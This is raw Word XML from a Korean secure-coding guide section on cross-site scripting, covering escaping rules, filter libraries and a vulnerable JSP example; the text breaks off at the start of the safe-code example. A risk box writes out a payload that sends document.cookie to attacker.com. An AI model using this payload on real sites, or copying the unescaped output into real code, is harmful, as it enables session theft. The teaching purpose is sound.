          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정보 탈취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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부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입력값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출력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시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> HTML </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>특수문자를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엔티티로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치환한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> (&amp; → &amp;amp;, &lt; → &amp;lt;, &gt; → &amp;gt; </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>).</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>• JSP</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에서는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> JSTL &lt;c:out&gt; </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>태그를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사용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• XSS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>방지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라이브러리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">(NAVER Lucy-XSS-Filter, OWASP ESAPI </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를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활용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• HTML </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>태그를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허용하는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게시판은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허용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태그를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화이트리스트로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관리한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>화면에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>출력</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String keyword = request.getParameter("keyword");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">// JSP: </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>검색어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> : &lt;%=keyword%&gt;  → &lt;script&gt;alert(1)&lt;/script&gt; </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>그대로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>실행됨</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검색어에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> &lt;script&gt;document.location='http://attacker.com?c='+document.cookie&lt;/script&gt; </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>페이지를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>열람한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모든</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>세션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿠키가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전송됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>세션으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>피해자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>도용이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능하며</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>피싱</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>페이지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>삽입</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>키로깅</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스크립트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>확장될</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
